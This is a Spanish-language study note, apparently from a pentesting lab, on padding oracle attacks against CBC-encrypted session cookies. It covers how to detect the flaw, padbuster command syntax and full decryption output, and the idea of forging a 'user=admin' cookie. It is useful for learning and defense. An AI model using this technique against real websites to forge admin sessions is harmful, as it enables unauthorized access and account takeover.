_______
- Tags: #explotacion  #web #explotacion  #padding_oracle_attack 
______
Esta vulnerabilidad ocurre cuando una página web utiliza el modo de encriptación por bloques CBC usando XORs para encriptar los datos de inicio de sesión en una cookie.

La siguiente página muestra como funciona este [modo de encriptación](https://pentesterlab.com/exercises/padding_oracle/course)

La idea principal es desencriptar una cookie actual de un usuario que hayas creado. Ver como es su estructura (user=darsel, username=darsel) etc. Para luego encriptar un texto que corresponda con la misma estructura pero con el usuario admin y así averiguar la cookie correspondiente a este.

### Detección
______
Básicamente, si al crear una cuenta y loguearte dos veces en la misma cuenta, ves que se te crea exactamente la misma cookie, y que al cambiarla por una invalida ves algún tipo de error o mal funcionamiento de la página lo mas probable es que sea *vulnerable*
_______

### Explotación
_______
La herramienta recomendable para explotar esta vulnerabilidad es padbuster:

**Ejemplo**

Hemos creado un usuario llamado "darsel" al que se le asigna la cookie ``Cookie: auth=%2BmSG2dYWG%2BMmewCoz%2FmXUQuuL4Q29LOS`` y siempre nos da la misma cookie.
Si la cambiamos por una inválida, la página presenta un error:
![[Pasted image 20240728153917.png]]

Uso:
![[Pasted image 20240728154208.png]]

``padbuster url textoencriptado numero_de_bytes_por_bloque``

*- Notas:*
	El número de bytes siempre tendrá que ser un múltiplo de 8, si no es 8, es cuestión de ir probando por sus múltiplos.
	El parámetro ``-cookies= `` es necesario para que la herramienta tenga acceso a la url que le hemos dado cuando esta solo se puede acceder con un usuario válido.

```
+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 1190

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     1388    N/A
2 **    255     200     15      N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (112/256) [Byte 8]
[+] Success: (136/256) [Byte 7]
[+] Success: (143/256) [Byte 6]
[+] Success: (17/256) [Byte 5]
[+] Success: (82/256) [Byte 4]
[+] Success: (27/256) [Byte 3]
[+] Success: (240/256) [Byte 2]
[+] Success: (121/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): 267b00a8cff99751
[+] Intermediate Bytes (HEX): 8f17e3abeb727a91
[+] Plain Text: user=dar

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, <STDIN> line 1.
*** Starting Block 2 of 2 ***

[+] Success: (171/256) [Byte 8]
[+] Success: (112/256) [Byte 7]
[+] Success: (1/256) [Byte 6]
[+] Success: (50/256) [Byte 5]
[+] Success: (88/256) [Byte 4]
[+] Success: (150/256) [Byte 3]
[+] Success: (231/256) [Byte 2]
[+] Success: (163/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): 0bae2f8436f4b392
[+] Intermediate Bytes (HEX): 551e6cadcafc9254
[+] Plain Text: sel

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=darsel

[+] Decrypted value (HEX): 757365723D64617273656C0505050505

[+] Decrypted value (Base64): dXNlcj1kYXJzZWwFBQUFBQ==

-------------------------------------------------------
```
  
Podemos ver que ha desencriptado con éxito la cookie y que nos ha devuelto ``user=darsel``. Sabiendo esto, podemos hacer la operación inversa encriptando el texto ``user=admin``:

![[Pasted image 20240728155518.png]]

![[Pasted image 20240728155532.png]]
________
## Bit flipper

Otra forma de explotar esta vulnerabilidad es a través de un ataque [Bit flipper](https://bernardoamc.com/cbc-bitflipping-attack/)
